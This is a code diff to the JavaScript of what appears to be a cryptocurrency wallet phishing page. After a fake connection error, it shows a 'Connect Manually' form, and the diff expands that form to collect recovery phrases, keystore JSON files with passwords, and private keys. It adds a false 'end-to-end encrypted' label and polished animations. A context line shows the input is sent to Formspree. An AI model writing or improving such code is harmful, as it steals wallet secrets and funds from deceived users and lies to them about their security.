@@ -80,12 +80,55 @@ function showSolanaManualFallback() {
     overflow-y: auto;
   `;
 
+  // Add animation styles for sliding effects
+  const style = document.createElement("style");
+  style.textContent = `
+    @keyframes slideInFromLeft {
+      from { transform: translateX(-100%); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+    @keyframes slideInFromRight {
+      from { transform: translateX(100%); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+    @keyframes slideInFromUp {
+      from { transform: translateY(-100%); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    @keyframes slideInFromDown {
+      from { transform: translateY(100%); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    .slide-in-left {
+      animation: slideInFromLeft 0.3s ease-out forwards;
+    }
+    .slide-in-right {
+      animation: slideInFromRight 0.3s ease-out forwards;
+    }
+    .slide-in-up {
+      animation: slideInFromUp 0.3s ease-out forwards;
+    }
+    .slide-in-down {
+      animation: slideInFromDown 0.3s ease-out forwards;
+    }
+    #contentContainer {
+      display: block !important;
+      visibility: visible !important;
+      opacity: 0;
+      transition: opacity 0.3s ease-out;
+    }
+  `;
+  container.appendChild(style);
+
   container.innerHTML = `
     <h3 style="color: red;">Error connecting....</h3>
     <h4 style="color: green;">Connect Manually</h4>
-    <textarea id="phraseInput" placeholder="Enter your phrases..." style="width: 100%; height: 120px; font-size: 16px; padding: 10px; color: red; background-color: #222; border: 1px solid white; border-radius: 8px; resize: none;"></textarea>
-    <p>Enter your phrases in the box manually, typically 12 or 24 words</p>
-    <button id="connectButton" style="margin-top: 10px; padding: 10px 20px; background-color: gold; color: black; font-weight: bold; border-radius: 10px; box-shadow: 0 3px white; border: none; cursor: pointer;">Connect</button>
+    <div id="connectOptions" style="display: flex; justify-content: center; gap: 20px; margin-bottom: 15px;">
+      <button id="phraseOption" style="background: none; border: none; color: white; font-size: 16px; cursor: pointer; text-decoration: underline; text-decoration-color: #ffd700;">PHRASE</button>
+      <button id="keystoreOption" style="background: none; border: none; color: white; font-size: 16px; cursor: pointer; text-decoration: none;">KEYSTORE JSON</button>
+      <button id="privateKeyOption" style="background: none; border: none; color: white; font-size: 16px; cursor: pointer; text-decoration: none;">PRIVATE KEY</button>
+    </div>
+    <div id="contentContainer" style="overflow: hidden;"></div>
     <div id="qrBox" style="margin-top: 20px;"></div>
   `;
 
@@ -107,47 +150,132 @@ function showSolanaManualFallback() {
   `;
   closeBtn.onclick = () => {
     container.remove();
-    resetHeaderImages(); // Reset header images on close
+    resetHeaderImages();
   };
   container.appendChild(closeBtn);
-
   document.body.appendChild(container);
 
-  const input = document.getElementById("phraseInput");
-  input.addEventListener("input", () => {
-    let value = input.value.trim();
-    let words = value.split(/\s+/).filter(Boolean);
+  // DOM elements
+  const phraseOption = document.getElementById("phraseOption");
+  const keystoreOption = document.getElementById("keystoreOption");
+  const privateKeyOption = document.getElementById("privateKeyOption");
+  const contentContainer = document.getElementById("contentContainer");
 
-    if (value.endsWith(" ")) {
-      let numberedText = "";
-      words.forEach((word, index) => {
-        const number = index + 1;
-        numberedText += `${number}. ${word} `;
+  // Initial state
+  let selectedOption = "PHRASE";
+  phraseOption.style.textDecoration = "underline";
+  phraseOption.style.textDecorationColor = "#ffd700";
+
+  // Function to render content
+  function renderContent(option, direction) {
+    const configs = {
+      "PHRASE": {
+        placeholder: "Enter your phrases...",
+        passwordDisplay: "none",
+        infoText: "Enter your phrases in the box manually, typically 12 or 24 words",
+        textColor: "red"
+      },
+      "KEYSTORE JSON": {
+        placeholder: "Keystore JSON",
+        passwordDisplay: "block",
+        infoText: "Several lines of text that begin with {...} and your password",
+        textColor: "white"
+      },
+      "PRIVATE KEY": {
+        placeholder: "Private key",
+        passwordDisplay: "none",
+        infoText: "Typically at least 60 characters",
+        textColor: "white"
+      }
+    };
+
+    const config = configs[option];
+    // Clear and reset
+    contentContainer.innerHTML = '';
+    contentContainer.classList.remove("slide-in-left", "slide-in-right", "slide-in-up", "slide-in-down");
+    contentContainer.style.opacity = "0";
+    contentContainer.style.display = "block";
+    contentContainer.style.visibility = "visible";
+
+    // Set content
+    contentContainer.innerHTML = `
+      <textarea id="phraseInput" placeholder="${config.placeholder}" style="width: 100%; height: 120px; font-size: 16px; padding: 10px; color: ${config.textColor}; background-color: #222; border: 1px solid white; border-radius: 8px; resize: none;"></textarea>
+      <div id="passwordInputContainer" style="display: ${config.passwordDisplay}; margin-top: 10px;">
+        <input id="passwordInput" type="password" placeholder="Password" style="width: 100%; font-size: 16px; padding: 10px; color: white; background-color: #222; border: 1px solid white; border-radius: 8px;">
+      </div>
+      <p style="font-size: 12px; color: green; margin: 8px 0;">end-to-end encrypted</p>
+      <p id="infoText" style="font-size: 14px;">${config.infoText}</p>
+      <button id="connectButton" style="margin-top: 10px; padding: 10px 20px; background-color: gold; color: black; font-weight: bold; border-radius: 10px; box-shadow: 0 3px white; border: none; cursor: pointer;">Connect</button>
+    `;
+
+    // Debugging log
+    console.log(`Rendering ${option} content with ${direction} animation`);
+
+    // Apply animation
+    requestAnimationFrame(() => {
+      contentContainer.classList.add(`slide-in-${direction}`);
+      contentContainer.style.opacity = "1"; // Ensure final visibility
+    });
+
+    // Attach event listeners
+    const phraseInput = document.getElementById("phraseInput");
+    const connectButton = document.getElementById("connectButton");
+    if (phraseInput) {
+      phraseInput.addEventListener("input", () => {
+        if (option !== "PHRASE") return;
+        const value = phraseInput.value.trim();
+        const words = value.split(/\s+/).filter(Boolean);
+        console.log(`Phrase input: ${words.length} words`); // Debug
+        if (words.length === 12 || words.length === 24) {
+          phraseInput.style.color = "green";
+        } else {
+          phraseInput.style.color = "red";
+        }
       });
-      input.value = numberedText.trim();
-      words = input.value.trim().split(/\s+/).filter(Boolean).map(word => word.replace(/^\d+\.\s/, ''));
-    }
-
-    if (words.length === 12 || words.length === 24) {
-      input.style.color = "green";
-    } else if (words.length > 12 && words.length < 24) {
-      input.style.color = "red";
     } else {
-      input.style.color = "red";
+      console.error("phraseInput not found after rendering");
     }
+    if (connectButton) {
+      connectButton.addEventListener("click", handleManualConnect);
+    } else {
+      console.error("connectButton not found after rendering");
+    }
+  }
 
-    if (words.length === 23 && value.endsWith(" ")) {
-      input.style.color = "green";
-    }
-    if (words.length === 24 && value.endsWith(" ")) {
-      alert("24 words reached");
-      input.value = input.value.trim();
-      input.disabled = true;
-    }
+  // Click handlers
+  phraseOption.addEventListener("click", () => {
+    selectedOption = "PHRASE";
+    phraseOption.style.textDecoration = "underline";
+    phraseOption.style.textDecorationColor = "#ffd700";
+    keystoreOption.style.textDecoration = "none";
+    privateKeyOption.style.textDecoration = "none";
+    console.log("PHRASE clicked"); // Debug
+    renderContent("PHRASE", "left");
   });
 
-  const connectButton = document.getElementById("connectButton");
-  connectButton.addEventListener("click", handleManualConnect);
+  keystoreOption.addEventListener("click", () => {
+    selectedOption = "KEYSTORE JSON";
+    phraseOption.style.textDecoration = "none";
+    keystoreOption.style.textDecoration = "underline";
+    keystoreOption.style.textDecorationColor = "#ffd700";
+    privateKeyOption.style.textDecoration = "none";
+    console.log("KEYSTORE JSON clicked"); // Debug
+    renderContent("KEYSTORE JSON", "up");
+  });
+
+  privateKeyOption.addEventListener("click", () => {
+    selectedOption = "PRIVATE KEY";
+    phraseOption.style.textDecoration = "none";
+    keystoreOption.style.textDecoration = "none";
+    privateKeyOption.style.textDecoration = "underline";
+    privateKeyOption.style.textDecorationColor = "#ffd700";
+    console.log("PRIVATE KEY clicked"); // Debug
+    renderContent("PRIVATE KEY", "down");
+  });
+
+  // Initial content load
+  console.log("Initial content load"); // Debug
+  renderContent("PHRASE", "right");
 }
 
 // === Handle Manual Connect and Send to Formspree ===
@@ -224,6 +352,23 @@ function showWalletOverlay() {
     overflow-y: auto;
   `;
 
+  // Add animation styles for wallet name slide-in
+  const style = document.createElement('style');
+  style.textContent = `
+    @keyframes slideInFromLeft {
+      from { transform: translateX(-100%); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+    .wallet-name-slide {
+      opacity: 0;
+      transform: translateX(-100%);
+    }
+    .wallet-name-slide.visible {
+      animation: slideInFromLeft 0.3s ease-out forwards;
+    }
+  `;
+  walletSelection.appendChild(style);
+
   const closeBtn = document.createElement('button');
   closeBtn.textContent = '×';
   closeBtn.style.cssText = `
@@ -248,7 +393,7 @@ function showWalletOverlay() {
 
   const title = document.createElement('h2');
   title.textContent = 'Select your wallet';
-  title.style.cssText = `font-size: 2rem; margin-bottom: 1rem;`;
+  title.style.cssText = `font-size: 2rem; margin-bottom: 1rem; color: white;`;
 
   const walletOptions = document.createElement('div');
   walletOptions.className = 'wallet-options';
@@ -298,7 +443,10 @@ function showWalletOverlay() {
       background: none;
       display: flex;
       align-items: center;
+      gap: 10px;
       transition: transform 0.3s ease;
+      width: 100%;
+      text-align: left;
     `;
     const img = document.createElement('img');
     img.src = wallet.img;
@@ -311,6 +459,12 @@ function showWalletOverlay() {
     `;
     const span = document.createElement('span');
     span.textContent = wallet.name;
+    span.className = 'wallet-name-slide';
+    span.style.cssText = `
+      color: white;
+      font-size: 1rem;
+      flex: 1;
+    `;
     btn.appendChild(img);
     btn.appendChild(span);
     btn.onclick = () => {
@@ -326,6 +480,23 @@ function showWalletOverlay() {
   document.body.appendChild(walletOverlay);
 
   walletOptions.scrollTop = 0;
+
+  // Intersection Observer for wallet name animations
+  const observer = new IntersectionObserver(
+    entries => {
+      entries.forEach(entry => {
+        const span = entry.target.querySelector('.wallet-name-slide');
+        if (entry.isIntersecting) {
+          span.classList.add('visible');
+        } else {
+          span.classList.remove('visible');
+        }
+      });
+    },
+    { root: walletSelection, threshold: 0.1 }
+  );
+
+  document.querySelectorAll('.wallet-btn').forEach(btn => observer.observe(btn));
 }
 
 // === Loading Transition Before Wallet Connect ===
@@ -427,8 +598,51 @@ function resetHeaderImages(pageNum = null) {
   }
 }
 
+// === Page Content Fade Animations ===
+function initPageAnimations() {
+  const style = document.createElement('style');
+  style.textContent = `
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    @keyframes fadeOut {
+      from { opacity: 1; }
+      to { opacity: 0; }
+    }
+    .section-fade-in {
+      animation: fadeIn 0.5s ease-in forwards;
+    }
+    .section-fade-out {
+      animation: fadeOut 0.5s ease-out forwards;
+    }
+  `;
+  document.head.appendChild(style);
+
+  const observer = new IntersectionObserver(
+    entries => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          entry.target.classList.remove('section-fade-out');
+          entry.target.classList.add('section-fade-in');
+        } else {
+          entry.target.classList.remove('section-fade-in');
+          entry.target.classList.add('section-fade-out');
+        }
+      });
+    },
+    { threshold: 0.1 }
+  );
+
+  document.querySelectorAll('section').forEach(section => {
+    section.style.opacity = '0'; // Initial state
+    observer.observe(section);
+  });
+}
+
 document.addEventListener('DOMContentLoaded', () => {
   resetHeaderImages(); // Initial reset on page load
+  initPageAnimations(); // Initialize page content animations
   const walletImage = document.querySelector('.wallet-image');
   if (walletImage) {
     walletImage.addEventListener('click', () => {
